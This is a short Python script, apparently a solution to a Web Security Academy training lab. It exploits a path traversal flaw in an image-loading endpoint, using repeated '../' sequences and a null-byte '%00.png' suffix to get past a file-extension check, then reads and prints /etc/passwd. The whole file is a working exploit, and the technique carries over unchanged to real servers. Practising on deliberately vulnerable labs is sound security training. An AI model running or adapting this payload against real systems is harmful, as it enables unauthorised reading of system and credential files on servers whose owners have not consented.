import requests

DOMAIN = "0a0f00e4037f9aca80875dc6008d00c8.web-security-academy.net"

def get_file_content(path):
    payload = "../" * 5 + path + "%00.png"

    response = requests.get(f"https://{DOMAIN}/image?filename={payload}")
    print(response.text)

get_file_content("/etc/passwd")